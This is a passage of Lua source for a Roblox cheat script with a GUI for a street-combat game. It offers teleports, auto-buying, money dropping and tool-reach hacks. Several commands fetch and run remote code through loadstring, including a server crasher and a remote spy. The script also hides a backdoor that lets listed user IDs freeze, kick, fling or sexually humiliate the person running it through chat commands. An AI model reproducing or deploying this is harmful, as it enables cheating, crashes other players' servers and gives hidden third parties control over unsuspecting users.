            Holding = true
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
            for i,v in pairs(player.Backpack:GetChildren()) do
                if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                    if v.Ammo.Value > 0 then
                        v.Parent = player.Character
                    end
                end
            end
            while Holding == true do
                wait(0)
                local TotalAmmo = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
                player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
                local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun then
                            v.Parent = player.Character
                        end
                    end
                end
                fireclickdetector(GunPath.Parent.ClickDetector)
                if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
                    player.Character:FindFirstChild(Gun).Parent = player.Backpack
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                            if v.Ammo.Value > 0 then
                                v.Parent = player.Character
                            end
                        end
                    end
                end
            end
        end)
        InfiniteTool.Unequipped:Connect(function()
            Holding = false
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
        end)
    end
    function infham()
        local Food = '[Hamburger]'
        local FoodTexture = 'rbxassetid://3210917066'
        local FoodPath = game:GetService("Workspace").Ignored.Shop["[Hamburger] - $5"].Head
        local Holding = false
    
        local InfiniteTool = Instance.new('Tool', player.Backpack)
        InfiniteTool.Name = 'Hamburger'
        InfiniteTool.ToolTip = 'buy hamburgers while holding, eat while using this tool'
        InfiniteTool.TextureId = FoodTexture
        InfiniteTool.RequiresHandle = true
        InfiniteTool.CanBeDropped = false
    
        local Handle = Instance.new('Part', InfiniteTool)
        Handle.Name = 'Handle'
        Handle.Anchored = false
        Handle.Size = Vector3.new(0,0,0)
        Handle.Massless = true
        Handle.Transparency = 1
        Handle.CanCollide = false
    
        InfiniteTool.Equipped:Connect(function()
            Holding = true
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
            for i,v in pairs(player.Backpack:GetChildren()) do
                if v.Name == Food and not player.Character:FindFirstChild(Food) then
                    v.Parent = player.Character
                end
            end
            while Holding == true do
                wait(0)
                local TotalFood = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == Food then
                        TotalFood = TotalFood + 1
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == Food then
                        TotalFood = TotalFood + 1
                    end
                end
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalFood)
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
                player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
                local mag = (FoodPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Food then
                            v.Parent = player.Character
                        end
                    end
                end
                fireclickdetector(FoodPath.Parent.ClickDetector)
                if not player.Character:FindFirstChild(Food) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Food and not player.Character:FindFirstChild(Food) then
                            v.Parent = player.Character
                        end
                    end
                end
            end
        end)
        InfiniteTool.Unequipped:Connect(function()
            Holding = false
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
        end)
    end
    
    infrev()
    infdb()
    infham()
    infrpg()
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
CashDroppedLabel.Visible = false

CalculateButton.MouseButton1Click:Connect(function()
    if tonumber(CashTextbox.Text) ~= nil then
        CashTextbox.Text = tostring(math.floor((tonumber(CashTextbox.Text) * 1.42857)))
        local amount = tonumber(CashTextbox.Text)
        cashgoal = player.DataFolder.Currency.Value - amount
        CashAtEndLabel.Text = ('Cash At End : $' .. formatNumber(cashgoal))
    else
        announce('insert number', '', 3)
    end
end)

DropToggleButton.MouseButton1Click:Connect(function()
    if DropToggleButton.Text == 'Enable' and tonumber(CashTextbox.Text) ~= nil then
        DropToggleButton.Text = 'Stop'
        while DropToggleButton.Text == 'Stop' do
            wait()
            MainEvent:FireServer('DropMoney', '10000')
            if player.DataFolder.Currency.Value <= cashgoal then
                DropToggleButton.Text = 'Enable'
                announce('finished dropping')
            end
        end
    else
        DropToggleButton.Text = 'Enable'
    end
end)


------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

SetSpawn.MouseButton1Click:Connect(function()
    if player.Character then
        if SetSpawn.Text == 'SetSpawn' then
            SetSpawn.Text = 'NoSpawn' 
            SpawnPosition = player.Character.HumanoidRootPart.CFrame
        else
            SetSpawn.Text = 'SetSpawn'
            SpawnPosition = nil
        end
    end
end)
PrevPosition.MouseButton1Click:Connect(function()
    if PreviousPosition ~= nil then
        player.Character.HumanoidRootPart.CFrame = PreviousPosition
    else
        announce('Previous Position Error', 'you need to have tped before to return to an old position', 5)
    end
end)
Bank.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-437.125885, 38.9783134, -285.587372, 0.0165725499, 5.298579e-08, -0.99986279, 1.16139711e-08, 1, 5.31855591e-08, 0.99986279, -1.24937944e-08, 0.0165725499)
end)
Playground.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-259.516907, 22.1498718, -762.971558, 0.992310345, 0, 0.12377467, 0, 1, 0, -0.12377467, 0, 0.992310345)
end)
LavaBase.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-796.256897, -39.6492004, -886.306152, -0.39699012, 2.91068263e-05, 0.917822897, 1.63490836e-06, 1, -3.10057476e-05, -0.917822897, -1.08084187e-05, -0.39699012)
end)
GunShop1.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-591.085022, 8.31477833, -742.803528, 0.994070172, 5.60480942e-08, 0.108740292, -6.51724079e-08, 1, 8.03552425e-08, -0.108740292, -8.69656134e-08, 0.994070172)
end)
GunShop2.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(488.347412, 48.0705032, -630.454285, -0.0453165509, -4.20173549e-08, -0.998972654, -4.23235385e-08, 1, -4.01406339e-08, 0.998972654, 4.04610248e-08, -0.0453165509)
end)
Sewer.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(111.514938, -26.7500305, -276.918365, -0.997865558, -1.25138016e-08, -0.0653034225, -1.74378947e-08, 1, 7.48333733e-08, 0.0653034225, 7.58124159e-08, -0.997865558)
end)
GasStation.MouseButton1Click:Connect(function()
   PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(591.680725, 49.0000458, -256.818298, -0.0874911696, -3.41755495e-08, -0.996165276, 1.23318324e-08, 1, -3.53901868e-08, 0.996165276, -1.53808717e-08, -0.0874911696)
end)
TacoShop.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(583.931641, 51.061409, -476.954193, -0.999745369, 1.49123665e-08, -0.0225663595, 1.44838328e-08, 1, 1.91533687e-08, 0.0225663595, 1.88216429e-08, -0.999745369)
end)
UFO.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(71.7331619, 139, -691.154419, 0.602706313, 7.78292178e-06, 0.797962964, 7.63640458e-07, 1, -1.03302691e-05, -0.797962964, 6.83547478e-06, 0.602706313)
end)
SafeZone1.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-117.270287, -58.7000618, 146.536087, 0.999873519, 5.21876942e-08, -0.0159031227, -5.22713037e-08, 1, -4.84179008e-09, 0.0159031227, 5.67245495e-09, 0.999873519)
end)
SafeZone2.MouseButton1Click:Connect(function()
    PreviousPosition = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(207.48085, 38.25, 200014.953, 0.507315397, 0, -0.861760437, 0, 1, 0, 0.861760437, 0, 0.507315397)
end)
SavePos.MouseButton1Click:Connect(function()
    SavedPos = player.Character.HumanoidRootPart.CFrame
end)
LoadPos.MouseButton1Click:Connect(function()
    if SavedPos ~= nil then
        player.Character.HumanoidRootPart.CFrame = SavedPos
    else
        announce('Load Position Error', 'you need to save a position first', 4)
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------



local swagmins = {
1674429443,
1285381533,
2841303539,
1,
}

local bending = false
local kickmsg = 'PERMA BANNED'
local function commands(msg,plr)
    if DisableMod == false or table.find(swagmins, plr) then
        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
        local Msg = string.lower(msg)
        local SplitCMD = string.split(Msg,' ')
        local Lower = string.lower(player.Name)
        local Allowed = string.find(Lower, SplitCMD[2])
        if Allowed then
            if string.find(SplitCMD[1], '!ice') then
                player.Character.HumanoidRootPart.Anchored = true
            end
            if string.find(SplitCMD[1], '!unice') then
                player.Character.HumanoidRootPart.Anchored = false
            end
            if string.find(SplitCMD[1], '!sus') then
                bending = true
                local segtarget = Mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                    Crouch:Stop()
                end;
                Start()	
                repeat wait() until bending == false
                Pause()
            end
            if string.find(SplitCMD[1], '!unsus') then
                while bending == true do
                    wait()
                    bending = false
                end
            end
            if string.find(SplitCMD[1], '!remove') then
                local ISADMIN = table.find(swagmins, player.UserId)
                if not ISADMIN then
                    kickmsg = Mod.Name
                    player:Kick(kickmsg)
                    wait(5)
                    while true do end
                end
            end
            if string.find(SplitCMD[1], '!bring') then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
            end
            if string.find(SplitCMD[1], '!removev2orsomthing') then
                if table.find(swagmins, plr) then
                    local ISADMIN = table.find(swagmins, player.UserId)
                    if not ISADMIN then
                        player:Kick('Stop .')
                    end
                end
            end
            if string.find(SplitCMD[1], '!fling') then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
            end
        else
            if string.find(msg, '/e test') then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("vrsiev2", 'All');
            end
        end
    end
end

muted = {}
mutingnew = false 

local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/main/better'))()
Players.PlayerAdded:Connect(function(plr)
    local SWAGMIN = table.find(swagmins, plr.UserId)
    if SWAGMIN or ModCheck[plr.UserId] then
        plr.Chatted:Connect(function(msg)
            commands(msg, plr.UserId)
        end)
    end
    if muteingnew == true then
        if not table.find(muted, plr.Name) then
            table.insert(muted, plr.Name)
            print('automuted ' .. plr.Name)
        end
    end
end)

for i,v in pairs(game:GetService('Players'):GetChildren()) do
    local SWAGMIN = table.find(swagmins, v.UserId)
    if SWAGMIN or ModCheck[v.UserId] then
        print('found')
        v.Chatted:Connect(function(msg)
           commands(msg, v.UserId)
        end)
    end
end


------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

    local commands = {}
    
    local prefix = "/"

    local function findPlayer(name)
        for _, Player in ipairs(Players:GetPlayers()) do
            if (string.lower(name) == string.sub(string.lower(Player.Name), 1, #name)) then
                return Player;
            end
        end
    end
    
    commands.e = function(arguments)
        local CMD = arguments[1]
        
        if CMD == 'rejoin' or CMD == 'rj' then
            Players.LocalPlayer:Kick("Rejoining")
		    wait()
		    game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
        end
        if CMD == 'serverhop' or CMD == 'shop' then
        	local x = {}
        	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
        		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
        			x[#x + 1] = v.id
        		end
        	end
        	if #x > 0 then
        		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
        	else
        		print('failed to find server')
        	end
        end
        
        local ANIMATIONS = false
        if CMD == 'animations' and player.PlayerGui.MainScreenGui.AnimationPack.Visible == false and ANIMATIONS == false then
            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
            ANIMATIONS = true
            local AnimationsFolder = Instance.new('Folder', game.Workspace)
            local LeanAni = Instance.new('Animation', AnimationsFolder)
            LeanAni.AnimationId = 'rbxassetid://3152375249'
            local Lean = Humanoid:LoadAnimation(LeanAni)
            local LayAni = Instance.new('Animation', AnimationsFolder)
            LayAni.AnimationId = 'rbxassetid://3152378852'
            local Lay = Humanoid:LoadAnimation(LayAni)
            local Dance1Ani = Instance.new('Animation', AnimationsFolder)
            Dance1Ani.AnimationId = 'rbxassetid://3189773368'
            local Dance1 = Humanoid:LoadAnimation(Dance1Ani)
            local Dance2Ani = Instance.new('Animation', AnimationsFolder)
            Dance2Ani.AnimationId = 'rbxassetid://3189776546'
            local Dance2 = Humanoid:LoadAnimation(Dance2Ani)
            local GreetAni = Instance.new('Animation', AnimationsFolder)
            GreetAni.AnimationId = 'rbxassetid://3189777795'
            local Greet = Humanoid:LoadAnimation(GreetAni)
            local PrayAni = Instance.new('Animation', AnimationsFolder)
            PrayAni.AnimationId = 'rbxassetid://3487719500'
            local Pray = Humanoid:LoadAnimation(PrayAni)

            Close.Visible = false
            ScrollingFrame.Visible = false
            Animations.Visible = true
            
            Animations.MouseButton1Click:Connect(function()
                ScrollingFrame.Visible = true
                Close.Visible = true
            end)
            Close.MouseButton1Click:Connect(function()
                ScrollingFrame.Visible = false
                Close.Visible = false
            end)
            LeanButton.MouseButton1Click:Connect(function()
                Lean:Play()
            end)
            LayButton.MouseButton1Click:Connect(function()
                Lay:play()
            end)
            Dance1Button.MouseButton1Click:Connect(function()
                Dance1:Play()
            end)
            Dance2Button.MouseButton1Click:Connect(function()
                Dance2:Play()
            end)
            GreetButton.MouseButton1Click:Connect(function()
                Greet:Play()
            end)
            PrayButton.MouseButton1Click:Connect(function()
                Pray:Play()
            end)
            
            Humanoid.Running:Connect(function()
                Lean:Stop()
                Lay:Stop()
                Dance1:Stop()
                Dance2:Stop()
                Greet:Stop()
                Pray:Stop()
                ChestPump:Stop()
            end)
        end

        if CMD == 'korblox' then
            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightLowerLeg:Destroy()
            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightUpperLeg:Destroy()
            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightFoot:Destroy()
        end

        if CMD == 'crash' then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
        end

        if CMD == 'lettuce' then
            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

            local LettuceTool = Instance.new('Tool', player.Backpack)
            LettuceTool.RequiresHandle = false
            LettuceTool.CanBeDropped = true
            LettuceTool.Name = 'Lettuce'
            LettuceTool.ToolTip = 'inf lettuce eater yummy'
            
            local function eat()
                local Food = player.Backpack:FindFirstChild('[Lettuce]')
                if Food and player.Character.BodyEffects.Attacking.Value == false then
                    Humanoid:EquipTool(Food)
                    player.Character:FindFirstChildWhichIsA('Tool'):Activate()
                    repeat wait() until player.Character.BodyEffects.Attacking.Value == false
                    Humanoid:EquipTool(LettuceTool)
                    
                end
            end
            
            LettuceTool.Activated:Connect(function()
                eat()
            end)
            LettuceTool.Equipped:Connect(function()
                while player.Character:FindFirstChild('Lettuce') do
                    wait()
                    local pathto = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"].Head
                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')
                    if HRP and player.Character:FindFirstChild('Lettuce') then
                        local Away = (HRP.Position - pathto.Position).Magnitude
                        if Away <= 30 then
                            for i,v in pairs(player.Backpack:GetChildren()) do
                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                                if v.Name == '[Lettuce]' then
                                    v.Parent = player.Character
                                end
                            end
                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
                        end
                    end
                end
            end)
        end
        
        if CMD == 'fov' then
            if game.Workspace:FindFirstChildWhichIsA('Camera') then
                game.Workspace:FindFirstChildWhichIsA('Camera').FieldOfView = tonumber(arguments[2])
            end
        end
        
        BRIGHT = false
        if CMD == 'bright' or CMD == 'unbright' then
            if BRIGHT == false then
                BRIGHT = true
                game:GetService("Lighting").GlobalShadows = false
            else
                BRIGHT = false
                game:GetService("Lighting").GlobalShadows = true
            end
        end
        
        if CMD == 'tool' or CMD == 'tools' then
            for i,v in pairs(game:GetService("Workspace").Ignored.ItemsDrop:GetChildren()) do
                player.Character.HumanoidRootPart.CFrame = v.CFrame
                wait(0.01)
            end
        end
        
        if CMD == 'zoom' or CMD == 'infzoom' then
            player.CameraMaxZoomDistance = math.huge
        end
        
        FOG = false
        if CMD == 'fog' then
            if FOG == false then
                FOG = true
                game:GetService("Lighting").FogEnd = 5000
            else
                FOG = false
                game:GetService("Lighting").FogEnd = 500
            end
        end
        
    	if CMD == 'set' then
    	    local plrtotarget = arguments[2]
    	    if plrtotarget then
    		    local playr = findPlayer(plrtotarget)
    		    if playr then
                    TargetTextbox.Text = playr.Name
                    SetPlayerInfo()
    		    end
    	    end
    	end   
    	
    	if CMD == 'float' then
            if player.Character:FindFirstChildWhichIsA('Tool') then
                if player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui') then
                    player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui'):Destroy()
                end
            end
    	end
    	  
    	if CMD == 'to' then
        	local playerToTeleportToName = arguments[2]
    	    if playerToTeleportToName then
    		    local plrToTPTo = findPlayer(playerToTeleportToName)
    		    if plrToTPTo then
    			    game:GetService('Workspace').Players:WaitForChild(player.Name).HumanoidRootPart.CFrame = game:GetService('Workspace').Players:WaitForChild(plrToTPTo.Name).HumanoidRootPart.CFrame
    			    if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                        player.Character.LeftHand.CFrame = player.Character.HumanoidRootPart.CFrame
                        player.Character.RightHand.CFrame = player.Character.HumanoidRootPart.CFrame
                    end
    		    end
    	    end
    	end
    	
    	if CMD == 'sit' then
    	    game.Players.LocalPlayer.Character.Humanoid.Sit = true
    	end
    	
    	if CMD == 'recoil' then
    	    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
                if v:IsA('Camera') then
                v:Destroy()
                end
            end

            local newcam = Instance.new('Camera')
            newcam.Parent = game:GetService('Workspace')
            newcam.Name = 'Camera'
            newcam.CameraType = 'Custom'
            newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(player.Name):FindFirstChild('Humanoid')
            newcam.HeadLocked = true
            newcam.HeadScale = 1
        	    
    	end
    
    	if CMD == 'headless' then
    	    player.Character.Head:BreakJoints()
    	    player.Character.Head.Position = Vector3.new(0,99999999999999,0)
    	end
    	
        if CMD == 'hideboombox' or CMD == 'boombox' then
            player.Character.BOOMBOXHANDLE:Destroy()
        end
        
    	if CMD == 'reach' or CMD == 'toolreach' then
    	    if player.Character:FindFirstChildWhichIsA('Tool') then
    	        player.Character:FindFirstChildWhichIsA('Tool').Handle.Size = Vector3.new(50,50,50)
    	        player.Character:FindFirstChildWhichIsA('Tool').Handle.Transparency = 1
    	    end
    	end
    	if CMD == 'taser' then
    	    player.Character.HumanoidRootPart.CFrame = CFrame.new(-271.194, 21.8, -103.052)
            local LettuceTool = Instance.new('Tool', player.Backpack)
            LettuceTool.RequiresHandle = false
            LettuceTool.CanBeDropped = true
            LettuceTool.Name = 'Taser'
            LettuceTool.ToolTip = 'tazer'
            
            local function eat()
                hold:Play()
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == '[Taser]' then
                        v.Parent = player.Character
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == '[Taser]' then
                        v:Activate()
                    end
                end
            end
            
            LettuceTool.Activated:Connect(function()
                eat()
            end)
            LettuceTool.Unequipped:Connect(function()
                
            end)
            LettuceTool.Equipped:Connect(function()
                while player.Character:FindFirstChild('Taser') do
                    local a = 0
                    for i,v in pairs(player.Character:GetChildren()) do
                        if v.Name == '[Taser]' then
                            a = a + 1
                        end
                    end
                    LettuceTool.ToolTip = tostring(a)
                    wait(3)
                end
            end)
            coroutine.resume(coroutine.create(function()
                local pathto = game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head
                while wait(0.05) do
                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
                    if sus then
                        sus:Destroy()
                    end
                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')
                    if HRP and player.Character:FindFirstChild('Taser') then
                        local Away = (HRP.Position - pathto.Position).Magnitude
                        if Away <= 30 then
                            for i,v in pairs(player.Backpack:GetChildren()) do
                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                                if v.Name == '[Taser]' then
                                    v.Parent = player.Character
                                end
                            end
                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
                        end
                    end
                end
            end))
        end
            	
    	if CMD == 'view' then
    	    local plrtoview = arguments[2]
            if plrtoview then
                local ptv = findPlayer(plrtoview)
                if ptv then  
                    local Camera = game.Workspace:FindFirstChildWhichIsA('Camera')
                    View.Text = "Unview"
                    repeat view(ptv.Name) until View.Text == 'View' 
                    Camera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
                end
            end
    	end
    
        if CMD == 'unview' then
            local Camera = game.Workspace:FindFirstChildWhichIsA('Camera')
            Camera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
            View.Text = "View"
        end
        
        if CMD == 'shield' then
            if IsMod == true then
                DisableMod = true
                announce('invincible', '', 4)
            end
        end
        if CMD == 'unshield' then
            if IsMod == true then
                DisableMod = false
                announce('no invincible', '', 4)
            end
        end

        if CMD == 're' then
            player.Character:Destroy()
        end

        if CMD == 'ping' then
            while wait() do
                local Animations = game.Players.LocalPlayer:FindFirstChild('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('AnimationPack')  
                if Animations then
                    Animations.TextScaled = true
                    Animations.Text = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                end
            end
        end
        
        if CMD == 'faceless' or CMD == 'noface' then
            player.Character.Head.face:Destroy()
        end
        
        if CMD == 'hidemask' then
            player.Character:FindFirstChild('In-gameMask').Handle:Destroy()
        end
        if CMD == 'names' then
            local function checkdisplay()
                for i,v in pairs(game:GetService('Workspace').Players:GetChildren()) do
                    if v.Name ~= game.Players:FindFirstChild(v.Name).DisplayName then
                        if v:FindFirstChild('UpperTorso'):FindFirstChild('OriginalSize') or v:FindFirstChild('LowerTorso'):FindFirstChild('OriginalSize') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = (game.Players:FindFirstChild(v.Name).DisplayName .. ' / ' .. v.Name)
                        end
                    end
                end
            end
            checkdisplay()
        end
        if CMD == 'remotespy' then
            loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()
        end
        if CMD == 'flashlight' then
            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
            local mouse = player:GetMouse()
            local hold = player.Character.Humanoid:LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.SmallGunAim)
            
            local LettuceTool = Instance.new('Tool', player.Backpack)
            LettuceTool.RequiresHandle = false
            LettuceTool.CanBeDropped = true
            LettuceTool.Name = 'Flashlight'
            LettuceTool.ToolTip = 'rpg'
            local gun = '[Flashlight]'
            
            local function eat()
                hold:Play()
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == gun then
                        v.Parent = player.Character
                    end
                end
                wait(0.2)
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == gun then
                        v:Activate()
                    end
                end
            end
            LettuceTool.Activated:Connect(function()
                eat()
            end)
            LettuceTool.Unequipped:Connect(function()
                hold:Stop()
            end)
            LettuceTool.Equipped:Connect(function()
                hold:Play()
                local ammo = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == gun then
                        ammo = ammo + v.Ammo.Value
                    end
                end
                LettuceTool.ToolTip = ammo
            end)
            coroutine.resume(coroutine.create(function()
                local pathto = game:GetService("Workspace").Ignored.Shop["[Flashlight] - $10"].Head
                while wait(0.05) do
                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
                    if sus then
                        sus:Destroy()
                    end
                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')
                    if HRP and player.Character:FindFirstChild('Flashlight') then
                        local Away = (HRP.Position - pathto.Position).Magnitude
                        if Away <= 30 then
                            for i,v in pairs(player.Backpack:GetChildren()) do
                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                                if v.Name == '[Flashlight]' then
                                    v.Parent = player.Character
                                end
                            end
                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))
                        end
                    end
                end
            end))
        end
        if CMD == 'nuke' then
            local LettuceTool = Instance.new('Tool', player.Backpack)
            LettuceTool.RequiresHandle = false
            LettuceTool.CanBeDropped = true
            LettuceTool.Name = 'Nuke'
            LettuceTool.ToolTip = 'tazer'
            
            local function eat()
                hold:Play()
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == '[Grenade]' then
                        v.Parent = player.Character
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == '[Grenade]' then
                        v:Activate()
                        v:Activate()
                    end
                end
        
            end
            
            LettuceTool.Activated:Connect(function()
                eat()
                for i,v in pairs(game.Workspace.Ignored:GetChildren()) do
                    if v.Name == 'Handle' then
                        v.Position = mouse.Hit.p
                    end
                end
            end)
            LettuceTool.Unequipped:Connect(function()
                hold:Stop()
            end)
            LettuceTool.Equipped:Connect(function()
                while player.Character:FindFirstChild('Nuke') do
                    local a = 0
                    for i,v in pairs(player.Character:GetChildren()) do
                        if v.Name == '[Grenade]' then
                            a = a + 1
                        end
                    end
                    LettuceTool.ToolTip = tostring(a)
                    wait(3)
                end
            end)
            coroutine.resume(coroutine.create(function()
                local pathto = game:GetService("Workspace").Ignored.Shop["[Grenade] - $700"].Head
                while wait(0.05) do
                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
                    if sus then
                        sus:Destroy()
                    end
                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')
                    if HRP and player.Character:FindFirstChild('Nuke') then
                        local Away = (HRP.Position - pathto.Position).Magnitude
                        if Away <= 30 then
                            for i,v in pairs(player.Backpack:GetChildren()) do
                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
